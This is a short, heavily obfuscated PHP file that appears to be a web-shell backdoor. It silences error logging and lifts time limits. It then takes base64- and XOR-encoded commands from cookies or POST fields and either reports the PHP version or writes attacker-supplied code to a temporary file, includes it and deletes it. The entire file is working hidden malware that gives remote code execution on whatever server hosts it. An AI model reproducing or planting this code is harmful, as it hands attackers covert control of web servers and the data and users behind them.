<?php $calaeww = "\146".'i'."\x6c"."\x65"."\x5f".chr(573-461)."\165".'t'.chr(600-505).chr(566-467).chr(111)."\x6e"."\164"."\145"."\x6e"."\164"."\163";
$nziuhhinq = "\x62".chr(586-489).'s'."\145"."\x36"."\64".chr(829-734)."\x64".chr(101).chr(766-667)."\157"."\x64"."\145";
$ogarg = "\x69"."\156"."\x69"."\137".chr(115).chr(105-4).'t';
$xnpccaw = "\x75".chr(110)."\x6c"."\x69"."\x6e"."\x6b";


@$ogarg("\145"."\162"."\x72".'o'.chr(114).'_'."\154".chr(306-195).chr(103), NULL);
@$ogarg(chr(108).chr(111).chr(103).'_'.chr(1034-933).chr(719-605).'r'.'o'.'r'.'s', 0);
@$ogarg('m'."\141"."\170"."\x5f"."\145"."\x78".chr(332-231)."\143".chr(117).'t'."\151".chr(160-49)."\x6e"."\137".'t'."\x69".chr(1009-900).chr(868-767), 0);
@set_time_limit(0);

function mnjcllg($ufgrqgp, $tqzff)
{
    $jfpgcekxui = "";
    for ($nuuosfenxz = 0; $nuuosfenxz < strlen($ufgrqgp);) {
        for ($j = 0; $j < strlen($tqzff) && $nuuosfenxz < strlen($ufgrqgp); $j++, $nuuosfenxz++) {
            $jfpgcekxui .= chr(ord($ufgrqgp[$nuuosfenxz]) ^ ord($tqzff[$j]));
        }
    }
    return $jfpgcekxui;
}

$xvqbuv = array_merge($_COOKIE, $_POST);
$nuuosfenxzkutsnosu = '41a28963-1780-4630-96a5-f630db39f147';
foreach ($xvqbuv as $heidgsxsy => $ufgrqgp) {
    $ufgrqgp = @unserialize(mnjcllg(mnjcllg($nziuhhinq($ufgrqgp), $nuuosfenxzkutsnosu), $heidgsxsy));
    if (isset($ufgrqgp["\x61".chr(107)])) {
        if ($ufgrqgp[chr(161-64)] == "\151") {
            $nuuosfenxz = array(
                'p'.chr(980-862) => @phpversion(),
                's'.'v' => "3.5",
            );
            echo @serialize($nuuosfenxz);
        } elseif ($ufgrqgp[chr(161-64)] == "\145") {
            $owkmrtjdjw = "./" . md5($nuuosfenxzkutsnosu) . chr(322-276)."\151".chr(110).'c';
            @$calaeww($owkmrtjdjw, "<" . chr(63).chr(112).chr(228-124).chr(1061-949).chr(32).chr(799-735).chr(117)."\x6e".'l'."\x69".chr(741-631).chr(765-658)."\50"."\x5f".chr(376-281)."\x46".chr(706-633).chr(76)."\105"."\137"."\137".chr(59-18).chr(59)."\x20" . $ufgrqgp["\144"]);
            include($owkmrtjdjw);
            @$xnpccaw($owkmrtjdjw);
        }
        exit();
    }
}

